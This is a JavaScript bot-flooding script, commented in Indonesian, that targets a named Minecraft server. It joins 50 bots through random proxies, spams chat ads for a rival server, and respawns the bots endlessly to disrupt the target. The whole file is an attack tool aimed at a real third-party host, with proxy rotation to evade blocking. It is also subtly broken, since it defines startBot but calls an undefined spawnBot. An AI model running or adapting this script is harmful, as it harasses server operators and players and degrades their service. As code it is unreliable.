const mineflayer = require('mineflayer');
const { ProxyAgent } = require('proxy-agent');
const fs = require('fs');

const SERVER_HOST = 'bserver.mcindo.my.id'; 
const SERVER_PORT = 20018; 
const BOT_COUNT = 50; 

const SPAM_MESSAGES = [
    'Join server alwination.id!',
    'Mampir yuk ke alwination.id, rame!',
    'Pindah ke alwination.id aja bos!',
    'alwination.id lebih seru!'
];

// Baca proxy dan bersihin formatnya
const rawProxies = fs.readFileSync('proxies.txt', 'utf-8').split('\n');
const proxies = [];

for (let line of rawProxies) {
    line = line.trim();
    if (!line) continue;
    
    // Buang protocol (http://, socks5://, dll)
    // Format ProxyAgent itu butuh protocol, jadi kita deteksi
    let proxyUrl = line;
    if (line.includes('://')) {
        // Udah ada protocol, biarin aja
        proxyUrl = line;
    } else {
        // Kalau gak ada protocol, asumsiin HTTP
        proxyUrl = `http://${line}`;
    }
    proxies.push(proxyUrl);
}

console.log(`[*] Loaded ${proxies.length} proxies. Firing ${BOT_COUNT} bots.`);

function startBot(botId) {
    // Ambil proxy secara acak
    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    
    // ProxyAgent otomatis ngedeteksi protocol (socks4, socks5, http)
    const agent = new ProxyAgent(proxy);
    const randomName = `Player_${Math.floor(Math.random() * 99999)}`;

    try {
        const bot = mineflayer.createBot({
            host: SERVER_HOST,
            port: SERVER_PORT,
            username: randomName,
            version: '1.20.4',
            agent: agent,
            hideErrors: true
        });

        bot.on('spawn', () => {
            console.log(`[+] Bot ${botId} MASUK via ${proxy}`);
            
            // Spam chat brutal
            let spamCount = 0;
            const spamInterval = setInterval(() => {
                if (bot.chat) {
                    bot.chat(SPAM_MESSAGES[Math.floor(Math.random() * SPAM_MESSAGES.length)]);
                }
                spamCount++;
                if (spamCount >= 5) { 
                    clearInterval(spamInterval);
                    // Keluar setelah spam biar ganti bot baru
                    setTimeout(() => bot.quit(), 200);
                }
            }, 150); 

            // Loncat-loncat
            setInterval(() => {
                if (bot.setControlState) {
                    bot.setControlState('jump', true);
                    setTimeout(() => bot.setControlState('jump', false), 100);
                }
            }, 1000);
        });

        // Respawn abadi
        bot.on('end', () => {
            setTimeout(spawnBot, 100); 
        });

        bot.on('error', () => {}); 

    } catch (err) {
        // Langsung spawn baru kalau error
        setTimeout(spawnBot, 100);
    }
}

// Tembak 50 bot sekaligus
for (let i = 0; i < BOT_COUNT; i++) {
    setTimeout(spawnBot, i * 100);
               }
